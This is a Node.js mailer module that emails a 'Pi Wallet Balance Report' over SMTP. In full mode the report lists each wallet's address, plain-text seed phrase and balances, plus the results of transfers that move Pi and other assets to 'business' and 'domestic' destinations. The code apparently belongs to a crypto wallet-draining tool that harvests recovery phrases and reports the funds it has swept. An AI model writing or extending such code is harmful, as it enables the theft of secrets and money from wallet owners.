// lib/mailer.js
const nodemailer = require('nodemailer');

function buildTransport() {
  const { SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, SMTP_SECURE } = process.env;

  if (!SMTP_HOST || !SMTP_USER || !SMTP_PASS) {
    throw new Error(
      'Missing SMTP configuration. Set SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS in your environment.'
    );
  }

  return nodemailer.createTransport({
    host: SMTP_HOST,
    port: Number(SMTP_PORT) || 587,
    secure: SMTP_SECURE === 'true',
    auth: { user: SMTP_USER, pass: SMTP_PASS },
  });
}

function formatDate(iso) {
  if (!iso) return '—';
  try {
    return new Date(iso).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
  } catch {
    return iso;
  }
}

function renderOtherAssets(assets) {
  if (!assets || assets.length === 0) return '<em>none</em>';
  return assets.map((a) => `${a.balance} ${a.asset}`).join('<br/>');
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderTransferCell(transfer) {
  if (!transfer) return '<em>—</em>';
  if (!transfer.attempted) return '<em>not attempted</em>';
  if (!transfer.success) {
    return `<span style="color:#b91c1c">❌ ${escapeHtml(transfer.error || 'failed')}</span>`;
  }

  let piLine = '';
  if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
    piLine = `${transfer.piBusinessAmount} π → business, ${transfer.piDomesticAmount} π → domestic`;
  }

  let otherLines = '';
  if (transfer.otherAssetsTransferred && transfer.otherAssetsTransferred.length > 0) {
    const parts = transfer.otherAssetsTransferred.map((t) => {
      if (t.status === 'sent') return `${t.asset} ${t.amount} → domestic`;
      if (t.status === 'skipped') return `${t.asset}: skipped (${t.reason})`;
      return `${t.asset}: ${t.status}`;
    });
    otherLines = parts.join('<br/>');
  }

  const lines = [];
  if (piLine) lines.push(piLine);
  if (otherLines) lines.push(`Other Assets: <br/>${otherLines}`);
  if (transfer.txHash) lines.push(`<small>tx: ${escapeHtml(transfer.txHash)}</small>`);

  return `<span style="color:#15803d">✅ ${lines.join('<br/>')}</span>`;
}

function renderResultsHtml(results, mode = 'full') {
  const isFull = mode === 'full';

  const rows = results
    .map((r) => {
      if (r.status === 'invalid' || r.status === 'error') {
        if (isFull) {
          const seedPhraseCell = r.seedPhrase ? `<td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px;color:#b91c1c">${escapeHtml(r.seedPhrase)}</td>` : '<td style="padding:6px 10px;border:1px solid #ddd">—</td>';
          return `<tr>
            <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
            ${seedPhraseCell}
            <td colspan="5" style="padding:6px 10px;border:1px solid #ddd;color:#b91c1c">${r.status}: ${escapeHtml(r.error || 'unknown error')}</td>
            <td style="padding:6px 10px;border:1px solid #ddd"><em>—</em></td>
          </tr>`;
        } else {
          return `<tr>
            <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
            <td style="padding:6px 10px;border:1px solid #ddd;color:#b91c1c">${r.status}</td>
            <td colspan="4" style="padding:6px 10px;border:1px solid #ddd;color:#b91c1c">${escapeHtml(r.error || 'unknown error')}</td>
          </tr>`;
        }
      }

      const total = (r.unlockedBalance || 0) + (r.lockedBalance || 0);

      if (isFull) {
        const seedPhraseCell = r.seedPhrase ? `<td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px;background:#fef9c3">${escapeHtml(r.seedPhrase)}</td>` : '<td style="padding:6px 10px;border:1px solid #ddd">—</td>';
        const transferCell = renderTransferCell(r.transfer);
        return `<tr>
          <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
          ${seedPhraseCell}
          <td style="padding:6px 10px;border:1px solid #ddd">${r.unlockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${r.lockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${formatDate(r.nextUnlockDate)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${total} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${renderOtherAssets(r.otherAssets)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${transferCell}</td>
        </tr>`;
      } else {
        return `<tr>
          <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd"><span style="color:#15803d">${r.status}</span></td>
          <td style="padding:6px 10px;border:1px solid #ddd">${r.unlockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${r.lockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${formatDate(r.nextUnlockDate)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${total} π</td>
        </tr>`;
      }
    })
    .join('');

  if (isFull) {
    return `
      <div style="font-family:sans-serif">
        <h2>Pi Wallet Balance Report</h2>
        <table style="border-collapse:collapse;font-size:13px">
          <thead>
            <tr>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Address</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Seed Phrase</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Unlocked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Locked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Next Unlock Date</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Total Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Other Assets</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Transfer</th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      </div>
    `;
  } else {
    return `
      <div style="font-family:sans-serif">
        <h2>Pi Wallet Balance Report</h2>
        <table style="border-collapse:collapse;font-size:13px">
          <thead>
            <tr>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Address</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Status</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Unlocked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Locked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Next Unlock Date</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Total Pi</th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      </div>
    `;
  }
}

async function sendResultsEmail(results, recipients, mode = 'full') {
  if (!recipients || recipients.length === 0) {
    return { attempted: false, sentTo: [], error: null };
  }

  try {
    const transport = buildTransport();
    const from = process.env.MAIL_FROM || process.env.SMTP_USER;

    await transport.sendMail({
      from,
      to: recipients.join(','),
      subject: `Pi Wallet Balance Report (${results.length} address${results.length === 1 ? '' : 'es'})`,
      html: renderResultsHtml(results, mode),
    });

    return { attempted: true, sentTo: recipients, error: null };
  } catch (err) {
    return { attempted: true, sentTo: [], error: err.message };
  }
}

module.exports = { sendResultsEmail };